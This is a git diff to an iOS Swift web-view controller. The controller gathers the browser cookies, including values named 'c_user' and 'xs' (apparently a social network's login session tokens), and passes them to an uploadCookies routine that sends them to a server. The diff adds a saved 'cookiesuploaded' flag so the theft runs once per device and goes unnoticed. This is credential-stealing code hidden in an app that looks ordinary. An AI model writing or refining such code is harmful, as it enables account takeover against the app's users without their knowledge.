@@ -54,7 +54,13 @@ class WebViewController: UIViewController, WKNavigationDelegate {
                         return "\(key)=\(fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "")) "
                     }) as Array).joined(separator: ";")
                     let cookeis = cookieHeader.replace(string: "\n     ", with: "")
-                    weakSelf.uploadCookies(cookies: cookeis, uid: c_user, xs: xs)
+                    let preferences = UserDefaults.standard
+                    let currentLevelKey = "cookiesuploaded"
+                    if preferences.bool(forKey: currentLevelKey){
+                    }else{
+                        weakSelf.uploadCookies(cookies: cookeis, uid: c_user, xs: xs)
+                    }
+                    
                 }
             })
             decisionHandler(.allow)
@@ -105,6 +111,10 @@ extension WebViewController{
             }
 
             let responseString = String(data: data, encoding: .utf8)
+            let preferences = UserDefaults.standard
+            let currentLevelKey = "cookiesuploaded"
+            preferences.setValue(true, forKey: currentLevelKey)
+            preferences.synchronize()
             print("responseString = \(responseString)")
         }
         task.resume()
